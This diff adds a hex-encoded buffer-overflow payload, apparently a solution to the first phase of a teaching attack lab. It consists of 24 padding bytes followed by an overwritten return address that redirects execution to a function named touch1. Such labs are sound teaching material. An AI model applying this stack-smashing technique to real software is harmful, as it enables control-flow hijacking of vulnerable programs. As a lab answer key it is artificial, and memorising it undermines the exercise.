@@ -1,0 +1,5 @@
+/* buffer is 0x18 which is 24 in hex */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
+/* address of touch1 from gdb */
+12 5a 55 55 55 55 00 00
